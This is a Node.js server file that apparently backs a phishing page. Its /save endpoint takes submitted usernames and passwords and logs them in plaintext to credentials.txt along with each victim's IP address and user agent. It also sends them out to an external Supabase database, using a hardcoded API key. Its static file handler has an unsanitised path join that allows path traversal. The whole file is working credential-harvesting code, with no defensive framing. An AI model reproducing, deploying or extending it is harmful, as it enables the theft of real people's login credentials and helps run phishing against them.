const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');

const PORT = 3000;
const CREDS_FILE = path.join(__dirname, 'credentials.txt');

// Supabase config
const SUPABASE_URL = 'https://hqxmrbbwdnpznzvcgnrc.supabase.co';
const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhxeG1yYmJ3ZG5wem56dmNnbnJjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTE1NTk3MTIsImV4cCI6MjEwNzEzNTcxMn0.vStbzS8ZTIxS5pd2YEnuQFgs7qEVlu8eoOJq1PFhKOM';

const MIME = {
    '.html': 'text/html',
    '.css': 'text/css',
    '.js': 'application/javascript',
    '.png': 'image/png',
    '.jpg': 'image/jpeg',
    '.ico': 'image/x-icon',
};

// Save to Supabase
function saveToSupabase(data) {
    const payload = JSON.stringify({
        username: data.username,
        password: data.password,
        ip_address: data.ip || 'unknown',
        user_agent: data.userAgent || 'unknown'
    });

    const url = new URL(`${SUPABASE_URL}/rest/v1/credentials`);

    const options = {
        hostname: url.hostname,
        path: url.pathname,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'apikey': SUPABASE_KEY,
            'Authorization': `Bearer ${SUPABASE_KEY}`,
            'Prefer': 'return=minimal',
            'Content-Length': Buffer.byteLength(payload)
        }
    };

    const req = https.request(options, (res) => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => {
            if (res.statusCode === 201 || res.statusCode === 200) {
                console.log('  ✓ Saved to Supabase');
            } else {
                console.log(`  ✗ Supabase error (${res.statusCode}): ${body}`);
            }
        });
    });

    req.on('error', (e) => {
        console.log('  ✗ Supabase connection failed:', e.message);
    });

    req.write(payload);
    req.end();
}

const server = http.createServer((req, res) => {
    // API endpoint to save credentials
    if (req.method === 'POST' && req.url === '/save') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { username, password } = JSON.parse(body);
                const timestamp = new Date().toLocaleString();
                const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
                const userAgent = req.headers['user-agent'] || 'unknown';

                // Save to .txt file (local backup)
                const entry = `[${timestamp}]\nUsername: ${username}\nPassword: ${password}\nIP: ${ip}\n${'─'.repeat(40)}\n\n`;
                fs.appendFileSync(CREDS_FILE, entry, 'utf8');
                console.log(`\n  ✓ Saved to credentials.txt — ${username}`);

                // Save to Supabase
                saveToSupabase({ username, password, ip, userAgent });

                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ ok: true }));
            } catch (e) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }

    // Serve static files
    let filePath = req.url === '/' ? '/index.html' : decodeURIComponent(req.url.split('?')[0]);
    filePath = path.join(__dirname, filePath);
    const ext = path.extname(filePath);
    const contentType = MIME[ext] || 'application/octet-stream';

    fs.readFile(filePath, (err, data) => {
        if (err) {
            res.writeHead(404);
            res.end('Not found');
            return;
        }
        res.writeHead(200, { 'Content-Type': contentType });
        res.end(data);
    });
});

server.listen(PORT, () => {
    console.log(`\n  ✓ Server running at http://localhost:${PORT}`);
    console.log(`  ✓ Local backup: ${CREDS_FILE}`);
    console.log(`  ✓ Supabase: ${SUPABASE_URL}\n`);
});
